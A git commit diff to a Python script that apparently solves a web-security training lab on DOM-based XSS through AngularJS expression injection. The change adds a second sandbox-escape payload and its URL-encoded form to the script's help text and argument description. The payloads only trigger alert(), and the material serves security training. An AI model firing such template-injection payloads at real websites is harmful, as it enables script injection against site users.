5340e14ec43374f9067dfc71f1714008efcee51f
George Bourlakis <giorgosbourl@gmail.com>
2022-08-19 19:10:26 +0300

    Update script.py

--- Cross-Site Scripting (XSS)/DOM-based/AngularJS Expression/script.py
+++ Cross-Site Scripting (XSS)/DOM-based/AngularJS Expression/script.py
@@ -14,9 +14,15 @@ parser = argparse.ArgumentParser(description="""Cross-Site Scripting (XSS) Web S
 Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "{{constructor.constructor('alert("XSS")')()}}" -p 127.0.0.1:8080
 
 Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "{{constructor.constructor('alert("XSS")')()}}" 
+
+Another solution: {{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
+
+We need to URL-encode the symbols & and # which become: %26 and %23 respectively
+
+So the payload becomes: {{[].pop.constructor%26%2340'alert\u00281\u0029'%26%2341%26%2340%26%2341}}
 """, usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
 parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
-parser.add_argument('-c', '--command', help='Command to run, Example: {{constructor.constructor(\'alert("XSS")\')()}}', required=True)
+parser.add_argument('-c', '--command', help='Command to run, Example: {{constructor.constructor(\'alert("XSS")\')()}}, {{[].pop.constructor&#40\'alert\u00281\u0029\'&#41&#40&#41}}', required=True)
 parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
 args = parser.parse_args()
 
